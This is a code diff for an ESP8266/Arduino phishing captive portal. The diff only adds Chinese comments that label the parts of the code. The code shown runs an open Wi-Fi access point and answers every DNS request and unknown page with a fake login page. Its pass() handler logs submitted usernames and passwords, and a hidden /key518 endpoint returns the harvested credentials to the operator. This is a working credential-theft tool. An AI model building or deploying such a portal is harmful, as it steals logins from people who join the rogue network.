@@ -47,6 +47,7 @@ String getContentType(String filename){
 }  
 
 
+// 查看存储的账号和密码
 void paw(){
   if(webServer.arg("key")==ppassword){
     webServer.send(200, "text/plain", data);
@@ -55,6 +56,7 @@ void paw(){
   }
 }
 
+// 记录从钓鱼界面传过来的账号和密码
 void pass(){
   if(webServer.arg("user") != "" && webServer.arg("pass") != ""){
     data += "username:";
@@ -122,7 +124,7 @@ void index_r(){
   return;  
 }
 
-
+// 首页
 void handleRoot() { 
   File file = SPIFFS.open("/index.html", "r");  
   size_t sent = webServer.streamFile(file, "text/html");  
@@ -131,22 +133,26 @@ void handleRoot() {
 }
 
 void setup() {
+  // WIFI配置
   Serial.begin(9600);
   SPIFFS.begin();  
   WiFi.mode(WIFI_AP);
   WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));
   WiFi.softAP(ssid);
 
-  // if DNSServer is started with "*" for domain name, it will reply with
-  // provided IP to all DNS request
+  // DNS配置
   dnsServer.start(DNS_PORT, "*", apIP);
 
-  // replay to all requests with same HTML
+  // 配置404网页为首页
   webServer.onNotFound([]() {
     webServer.send(200, "text/html", responseHTML);
   });
+
+  // 配置查看密码网页
   webServer.on ("/key518", HTTP_GET, paw);
   webServer.on("/", handleRoot);
+
+  // 配置登录接口
   webServer.on("/pass", HTTP_GET, pass);
 
  webServer.on("/background.jpg", background);
